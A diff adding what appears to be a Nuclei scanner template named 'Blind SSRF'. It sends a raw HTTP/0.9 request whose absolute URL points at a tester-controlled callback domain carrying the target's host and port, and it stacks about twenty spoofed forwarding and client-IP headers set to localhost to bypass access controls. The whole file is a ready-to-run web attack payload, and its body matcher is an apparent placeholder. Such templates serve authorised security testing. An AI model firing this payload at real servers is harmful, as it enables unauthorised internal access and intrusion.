@@ -1,0 +1,45 @@
+id: 0x131
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET http://{{Host}}.{{Port}}.BSSRF-131.{{MY-DOMAIN}}/ HTTP/0.9
+      X-Forwarded-For: localhost
+      X-Forwarded-Host: localhost
+      X-Forwarded: localhost
+      Forwarded-For: localhost
+      Forwarded: for=localhost;by=localhost;host=localhost
+      X-Remote-IP: localhost
+      X-Remote-Addr: localhost
+      True-Client-IP: localhost
+      Client-IP: localhost
+      X-Client-IP: localhost
+      X-Cluster-Client-IP: localhost
+      WL-Proxy-Client-IP: localhost
+      Proxy-Client-IP: localhost
+      Fastly-Client-Ip: localhost
+      True-Client-Ip: localhost
+      X-Real-IP: localhost
+      X-Originating-IP: localhost
+      Ali-CDN-Real-IP: localhost
+      Cdn-Src-Ip: localhost
+      Cdn-Real-Ip: localhost
+      CF-Connecting-IP: localhost
+      X-Host: localhost
+      X-Custom-IP-Authorization: localhost
+      Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
